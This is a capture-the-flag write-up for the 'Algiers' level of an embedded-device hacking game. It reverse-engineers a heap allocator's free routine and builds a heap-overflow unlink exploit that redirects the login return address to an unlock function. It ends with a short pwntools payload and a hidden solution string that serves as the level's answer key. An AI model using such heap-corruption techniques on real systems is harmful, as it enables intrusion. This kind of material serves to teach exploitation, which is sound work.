# Algiers

> partial source code [here](./dump.asm)  
> **Vulnerability**: heap buffer overflow

## Analysis

pseudo c code for `<login>` function, manually decompiled assembly code from [here](./dump.asm):

```c
void login() {
    uint8_t *username = malloc(0x10);   // r10
    uint8_t *password = malloc(0x10);   // r11
    puts("Enter your username and password to continue");
    puts("Username >>");
    gets(username, 0x30);
    puts("(Remember: passwords are between 8 and 16 characters.)");
    gets(password, 0x30);
    if (test_password_valid(password) == 0) {
        // @ 469a
        puts("That password is not correct.");
        exit(0);
    } else {
        // @ 4690
        unlock_door();
        puts("Access granted.");
    }
    free(password);
    free(username);
}
```

For both `username` and `password`, `malloc` is called with `0x10` as size while `gets` is called with `0x30` as size, which is larger than the allocated size. This means that we can **overflow the heap buffer** for both `username` and `password`.

**Vulnerability**: heap buffer overflow

### Data Structures and Memory Layout for Heap

From the assembly code for `<malloc>`, we can see the memory section `0x2400` should probably be the heap.

#### 1. Observe the memory *before/after* the `malloc` calls

*before* 1st `malloc` call:

```text
0170: *  
2400: 0824 0010 0100 0000 0000 0000 0000 0000   .$..............
2410: 0000 0000 0000 0000 0000 0000 0000 0000   ................
2420: *  
```

*after* 1st `malloc` call:

```text
0170: *  
2400: 0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420: 0824 c81f 0000 0000 0000 0000 0000 0000   .$..............
2430: 0000 0000 0000 0000 0000 0000 0000 0000   ................
2440: *  
```

and `malloc` returns `0x240e` as the address for the allocated chunk.
(Reference to this chunk as `chunk1`)

*after* **2nd** `malloc` call:

```text
0170: *  
2400: 0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420: 3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
2450: *  
```

and `malloc` returns `0x2424` as the address for the allocated chunk.
(Reference to this chunk as `chunk2`)

***Look into `chunk1` and `chunk2`***, from the addresses stored, we can visualize the memory layout as follows:

```text
  `chunk1`                     `chunk2`
         +------------------------------------------+
         |                                          |
   2408 -> +--------+ <--+   +-> 241e -> +--------+ |
           | 0x2408 | ---+   |           | 0x2408 |-+
   240a -> +--------+        |   2420 -> +--------+
           | 0x241e | -------+           | 0x2434 |-----> 0x2434
   240c -> +--------+            2422 -> +--------+
           |  0x21  |                    |  0x21  |
   240e -> +--------+            2424 -> +--------+
           | <data> |                    | <data> |
           +--------+                    +--------+
```

(and `0x2400` keeps the address of the first chunk)

Therefore, the data structure for the chunks should be as follows:

```c
struct chunk {
  struct chunk *bk;
  struct chunk *fd;
  uint16_t size; // should be some kind of size with *lower bits as flags*
  char data[0];
};
```

#### 2. Reverse the `free` function

pseudo c code for `<free>` function, manually decompiled assembly code from [here](./dump.asm):

```c
void *free(void *payload) {
  // get the beginning of the chunk
  struct chunk *ptr = (struct chunk *)(((char *)payload) - 6);

  ptr->size = ptr->size & 0xfffe;
  struct chunk *bk = ptr->bk;
  uint16_t prev_size = bk->size;
  if (!(prev_size & 0x1)) {     // check if the previous chunk is free
    /* coalesce with bk */
    // goto 4524
    prev_size += 6;
    prev_size += ptr->size;
    bk->size = prev_size;
    bk->fd = ptr->fd;
    ptr->fd->bk = bk;
    ptr = bk;
  }
  // goto 453e
  struct chunk *fd = ptr->fd;
  uint16_t next_size = fd->size;
  if (!(next_size & 0x1)) {     // check if the next chunk is free
    /* coalesce with fd */
    // goto 454a
    next_size += ptr->size;
    next_size += 6;
    ptr->size = next_size;
    ptr->fd = fd->fd;
    fd->bk = ptr;
  }
  // goto 4560
  return ptr;
}
```

From the code, `if (!(prev_size & 0x1))` and `if (!(next_size & 0x1))`, we can find that the `size` field also keeps track of the current chunk's is free or not. Therefore, the data structure for the chunks should be as follows:

```c
struct chunk {
  struct chunk *bk;
  struct chunk *fd;
  union {
    uint16_t size;
    // specifies if the current chunk is allocated or not
    unsigned is_allocated:1;
  };
  char data[0];
};
```

and all the `size & 0x1` checks should be replaced with `is_allocated`.

Clean up the code a bit:

```c
void *free(void *payload) {
  // get the beginning of the chunk
  struct chunk *ptr = (struct chunk *)(((char *)payload) - 6);

  ptr->is_allocated = 0;
  struct chunk *bk = ptr->bk;
  if (!bk->is_allocated) {     // check if the previous chunk is free
    /* coalesce with bk */
    // goto 4524
    bk->size += 6;
    bk->size += ptr->size;
    bk->fd = ptr->fd;
    ptr->fd->bk = bk;
    ptr = bk;
  }
  // goto 453e
  struct chunk *fd = ptr->fd;
  if (!fd->is_allocated) {     // check if the next chunk is free
    /* coalesce with fd */
    // goto 454a
    ptr->size += fd->size;
    ptr->size += 6;
    ptr->fd = fd->fd;
    fd->bk = ptr;
  }
  // goto 4560
  return ptr;
}
```

**What is important from the `free` function?**

- never checks if the current chunk is free or not
  - vulnerable to **double free**
- coalesce with the previous chunk if it is free
- coalesce with the next chunk if it is free

**COALESCE**:
Whenever there is a coalesce, the `fd` and `bk` fields for the coalesced chunk will be modified.

##### Table for modification to `fd` and `bk` fields

> use `ptr` for pointer to the current chunk, and `fd = ptr->fd`, `bk = ptr->bk`  

| `fd` allocation? | `bk` allocation? | `ptr->fd` after free                  | `ptr->bk` after free | `fd->bk` after free                 | `bk->fd` after free                   |
|:----------------:|:----------------:|:-------------------------------------:|:--------------------:|:-----------------------------------:|:-------------------------------------:|
| free             | free             | fd                                    | bk                   | <span style="color:red"> bk </span> | <span style="color:red">fd->fd</span> |
| free             | allocated        | <span style="color:red">fd->fd</span> | bk                   | fd->bk                              | bk->fd                                |
| allocated        | free             | fd                                    | bk                   | <span style="color:red">bk</span>   | <span style="color:red">fd</span>     |
| allocated        | allocated        | fd                                    | bk                   | fd->bk                              | bk->fd                                |

<details>
  <summary><code>size</code> seems a bit wierd</summary>

> For both chunks, the `size` field is `0x21` when allocated and suggested that the chunk size is `0x20`. However, both chunks are occupied `0x16` bytes, which is `0x10` bytes for the data and `0x6` bytes for the metadata. It seems like the size value has beed calculated s.t. it is `0x10` aligned but the **actual** size of the chunk is not aligned.

</details>

### Thought: what is needed for the exploit?

1. *What to overwrite?*  
   ***Overwrite the return address of `<login>` function***
   
   > The return address is at `0x439a`

2. *How to overwrite?*  
   Utilize the heap buffer overflow to forge a fake **free** chunk with the coalescing in `<free>` function to overwrite of the `fd` and `bk` fields in fake chunk to set value(s) at certain address(es).

3. *What value(s) to set?*  
   From the program, there exists a function `<unlock_door>` at `0x4564`. Therefore, **the target should be modified the return address, `0x439a`, to `0x4564`**.

### How to utilize the heap buffer overflow

Use the heap buffer overflow for the first input/chunk, `username`, to overwrite the `fd` and `bk` fields of the second input/chunk, `password`.

#### How should the heap look like with the forge chunk

**FAKE_CHUNK_1**: forge chunk @ `<unlock_door>, 0x4564`

- `bk` field:   `3012` ~> `0x1230`
- `fd` field:   `7f00` ~> `0x007f`
- `size` field: `b012` ~> `0x12b0`
- `is_allocated` field: `0`

> Therefore, the chunk is **free**.

**FAKE_CHUNK_2**: forge chunk @ `<login> return address, 0x439a` - 2 = `0x4398`

- `bk` field:   `0000` ~> `0x0`
- `fd` field:   `4044` ~> `0x4440`
- `size` field: `0000` ~> `0x0`
- `is_allocated` field: `0`

> Therefore, the chunk is also **free**.

Since **FAKE_CHUNK_1** is free, if it is the `fd` or `bk` chunk of the <u>to be freed chunk</u>, it will be coalesced and the fields will be modified. Therefore, in order for the fields of **FAKE_CHUNK_1** to be *<u>preserved</u>*, it can not be ***directly*** before or after the <u>to be freed chunk</u>.

That is, need to *forge an additional fake chunk*, **FAKE_CHUNK_3**, between **FAKE_CHUNK_1** and the <u>to be freed chunk</u>.

Put **FAKE_CHUNK_3** @ `0x2424` and use the input for `password` to form its fields.

That is, as described [above](#table-for-modification-to-fd-and-bk-fields), which should set up the heap as the following case:

| `fd` allocation? | `bk` allocation? | `ptr->fd` after free | `ptr->bk` after free | `fd->bk` after free                 | `bk->fd` after free                   |
|:----------------:|:----------------:|:--------------------:|:--------------------:|:-----------------------------------:|:-------------------------------------:|
| free             | free             | fd                   | bk                   | <span style="color:red"> bk </span> | <span style="color:red">fd->fd</span> |

> `ptr` should be `chunk2 @ 0x241e`, `bk` should be `FAKE_CHUNK_2 @ 0x4398`, and `fd` should be `FAKE_CHUNK_3 @ 0x2424`  
> Also, the target should be setting the return address to `0x4564`, a.k.a. `bk->fd` should be `0x4564` after the `free` call.
> $\therefore$ `fd->fd = 0x4564`

##### Heap Setup

*before* `free(password)`:

```text
`chunk1`
@ 0x2408       +--------+--------+--------+
               | 0x2408 | 0x241e |      |1|
               +--------+--------+--------+
               ^    |        |
               +----+        |
                             |
               +-------------+
`chunk2`       |
 (ptr)         v
@ 0x241e       +--------+--------+--------+
               | 0x4398 | 0x2424 |      |1|
               +--------+--------+--------+
                    |        |
                    |        +-------------------------------------+
                    |                                              |
               +----+                                              |
`FAKE_CHUNK_2` |                                    `FAKE_CHUNK_3` |
 (bk)          v                                     (fd)          v
@ 0x4398       +--------+--------+--------+         @ 0x2424       +--------+--------+--------+
               | 0x0000 | 0x4440 |      |0|                        |   -    | 0x4564 |      |0|
               +--------+--------+--------+                        +--------+--------+--------+
                                                                                |
                                                                                |
                                                                   +------------+
                                                    `FAKE_CHUNK_1` |
                                                     (fd->fd)      v
                                                    @ 0x4564       +--------+--------+--------+
                                                                   | 0x1230 | 0x007f |      |0|
                                                                   +--------+--------+--------+
                                                                        |        |
                                                                        v        v
```

*after* `free(password)`:

```text
`chunk1`
@ 0x2408       +--------+--------+--------+
               | 0x2408 | 0x241e |      |1|
               +--------+--------+--------+
               ^    |        |
               +----+        |
                             |
               +-------------+
`chunk2`       |
 (ptr)         v
@ 0x241e       +--------+--------+--------+
               | 0x4398 | 0x2424 |      |0|
               +--------+--------+--------+
                    |        |
                    |        +-------------------------------------+
                    |                                              |
               +----+--------------------------+                   |
`FAKE_CHUNK_2` |                               |    `FAKE_CHUNK_3` |
 (bk)          v                               |     (fd)          v
@ 0x4398       +--------+--------+--------+    |    @ 0x2424       +--------+--------+--------+
               | 0x0000 | 0x4564 |      |0|    |                   | 0x4398 | 0x4564 |      |0|
               +--------+--------+--------+    |                   +--------+--------+--------+
                             |                 +------------------------+
                             |
                             +-------------------------------------+
                                                                   |
                                                    `FAKE_CHUNK_1` |
                                                     (fd->fd)      v
                                                    @ 0x4564       +--------+--------+--------+
                                                                   | 0x1230 | 0x007f |      |0|
                                                                   +--------+--------+--------+
                                                                        |        |
                                                                        v        v
```

That is, with the setup, `free(password)` will coalesce `chunk2` with **FAKE_CHUNK_2** and **FAKE_CHUNK_3**, and modify the fields, **FAKE_CHUNK_3**'s `bk` and **FAKE_CHUNK_2**'s `fd`. Therefore, the return address for `<login>` will be modified to `0x4564` with the modification to `FAKE_CHUNK_2`'s `fd`.

## Exploit

> setup the heap as described [above](#heap-setup)

1. **chunk2**
   
   > setup the metadata for **chunk2** need to use the input for `username`  
   
   The metadata for **chunk2** starts from `+ 0x10` from **chunk1**'s data field. Therefore, the input for `username` should be `0x10` bytes of padding, `0x4398` in little endian, and `0x2424` in little endian.

2. **FAKE_CHUNK_3**
   
   > setup the metadata for **FAKE_CHUNK_3** need to use the input for `password`  
   
   Specially crafted the **FAKE_CHUNK_3** at `0x2424` which is the start of the `data` field for `chunk2`, a.k.a. the input for `password`. Therefore, the input for `password` should be `0x2` bytes of padding, `0x4564` in little endian.

```python
from pwn import *
username = b'A' * 0x10 + p16(0x4398) + p16(0x2424)
password = b'B' * 0x2 + p16(0x4564)
```

<!-- solution: {\"level_id\":14,\"input\":\"4141414141414141414141414141414198432424;42426445;\"} -->
